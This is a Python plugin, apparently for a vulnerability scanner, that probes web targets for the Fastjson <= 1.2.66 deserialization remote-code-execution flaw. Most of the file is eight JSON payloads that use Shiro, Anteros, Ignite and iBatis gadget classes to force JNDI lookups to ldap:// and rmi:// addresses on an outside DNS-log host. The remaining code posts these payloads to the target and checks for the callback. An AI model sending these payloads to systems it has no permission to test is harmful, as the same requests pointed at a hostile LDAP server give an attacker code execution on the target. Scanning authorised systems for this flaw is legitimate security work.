#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Fastjson <= 1.2.66 反序列化
    暂无编号
        Payload: https://cloud.tencent.com/developer/article/1906247


'''

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'data': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://DNSDOMAIN/cmai"}'},
            {'data': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://DNSDOMAIN/zosk"}'},
            {'data': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://DNSDOMAIN/pzoq"}'},
            {'data': '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://DNSDOMAIN/mzli"}}'},
            {'data': '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"rmi://DNSDOMAIN/qpak"}'},
            {'data': '{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"rmi://DNSDOMAIN/sixu"}'},
            {'data': '{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"rmi://DNSDOMAIN/ajfi"}'},
            {'data': '{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"rmi://DNSDOMAIN/zlfi"}}'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        sessid = 'ff79d39d7f4ed0b1569765c84fddb401'
        
        vul_info = {
            'app_name': 'Fastjson',
            'vul_type': 'RCE',
            'vul_id': 'fastjson-v1.2.66-rce',
        }
        
        headers = {
            'Content-Type': 'application/json'
        }

        for payload in self.payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
            
            data = payload['data'].replace('DNSDOMAIN', dns_domain)

            res = client.request(
                'post',
                '',
                data=data,
                headers=headers,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (dns.result(md, sessid)):
                results = {
                    'Target': res.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
